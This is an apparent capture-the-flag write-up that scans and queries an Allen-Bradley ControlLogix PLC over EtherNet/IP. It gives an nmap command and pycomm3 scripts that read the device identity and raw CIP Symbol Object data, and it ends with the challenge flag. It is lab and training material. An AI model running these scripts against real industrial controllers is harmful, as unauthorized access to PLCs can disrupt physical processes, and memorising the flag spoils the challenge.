1. Recon
I used **nmap** to scan open port
```
nmap -sT -Pn -p 30959 154.57.164.70
```
As, a result I see open tcp port

2. Install **pycomm3**

3. Check prodect name:
```
from pycomm3 import CIPDriver

TARGET = "154.57.164.70"
PORT = 30959

# Переопределяем порт внутри настроек конфигурации драйвера
# Таким образом мы жестко заставим его стучаться на 30959
try:
    d = CIPDriver(TARGET)
    d._cfg['port'] = PORT  # Принудительная перезапись дефолтного 44818
    
    with d:
        print("[+] Соединение успешно открыто на кастомном порту!")
        ident = d.generic_message(
            service=b'\x0E',       # Get_Attribute_Single
            class_code=b'\x01',    # Identity Object
            instance=1,
            attribute=b'\x07'      # Product Name
        )
        print("Product Name:", ident.value)
        
except Exception as e:
    print(f"[-] Произошла ошибка: {e}")
```

4. To more info
```
from pycomm3 import CIPDriver

TARGET = "154.57.164.62"
PORT = 31351

with CIPDriver(f"{TARGET}:{PORT}") as d:
    ident = d.list_identity(f"{TARGET}:{PORT}")
    print("Identity:", ident)
```
Это **Allen-Bradley 1756-L61** 
Identity: {'encap_protocol_version': 1, 'ip_address': '0.0.0.0', 'vendor': 'Rockwell Automation/Allen-Bradley', 'product_type': 'Programmable Logic Controller', 'product_code': 54, 'revision': {'major': 20, 'minor': 11}, 'status': b'`1', 'serial': '006c061a', 'product_name': '1756-L61/B LOGIX5561', 'state': 255}

5. Now lets try read flag on FLAG tag
```
from pycomm3 import LogixDriver

TARGET = "154.57.164.62"
PORT = 31351

with LogixDriver(f"{TARGET}:{PORT}", init_tags=False, init_info=False) as plc:
    result = plc.read('FLAG')
    print("FLAG:", result)
```
As a result:
```
FLAG: FLAG, None, None, Tag doesn't exist - FLAG
```
That means tag FLAG has message which means original flag on other tag.

6. Lets try read Symbol Object (class 0x72). Get the bytes and decode it.
```
from pycomm3 import CIPDriver

TARGET = "154.57.164.69"
PORT = 31837

with CIPDriver(f"{TARGET}:{PORT}") as d:
    try:
        print("[*] Попытка №1: Чтение через Message Router (Class 0x02)...")
        req_data = b'\x91\x04FLAG\x01\x00'
        
        res1 = d.generic_message(
            service=b'\x4C',     # Read Tag
            class_code=b'\x02',  # Message Router
            instance=1,
            request_data=req_data
        )
        print("[+] Резалт 1:", repr(res1))
    except Exception as e:
        print("[-] Ошибка 1:", e)

    try:
        print("\n[*] Попытка №2: Get_Attribute_Single на Symbol Object (Class 0x72)...")
        res2 = d.generic_message(
            service=b'\x0E',     # Get_Attribute_Single
            class_code=b'\x72',  # Symbol Object
            instance=1,
            attribute=b'\x01'
        )
        print("[+] Резалт 2 (Сырые байты):", repr(res2))
        if res2.value:
            print("[+] Декодировано:", res2.value.decode('utf-8', errors='ignore'))
    except Exception as e:
        print("[-] Ошибка 2:", e)
```
As a result: `HTB{3th3rn3t1p_pwn3d}`


7. You can see that IP and PORT has differences. Cause I did it two days with breaks :)
